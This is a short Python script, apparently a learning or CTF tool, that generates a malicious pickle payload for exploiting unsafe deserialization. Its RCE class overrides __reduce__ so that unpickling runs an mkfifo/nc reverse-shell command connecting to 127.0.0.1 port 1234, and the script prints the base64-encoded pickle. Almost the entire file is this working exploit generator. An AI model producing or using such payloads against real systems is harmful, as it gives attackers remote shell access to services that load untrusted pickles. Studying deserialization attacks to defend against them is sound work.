"""
pickler - a program that creates reverse shells in a pickle

Based on sample code from
https://davidhamann.de/2020/04/05/exploiting-python-pickle/

Ljubljtube:
https://www.youtube.com/watch?v=HsZWFMKsM08
"""

import pickle
import base64
import os


# pylint: disable=too-few-public-methods
class RCE:
    """
    A class meant for remote code execution,
    including a reverse shell to a hardcoded IP number and port.
    """

    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


def main():
    """
    Serialize the RCE class into a pickle,
    base64 encode it, and print it.
    """

    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))


if __name__ == "__main__":
    main()
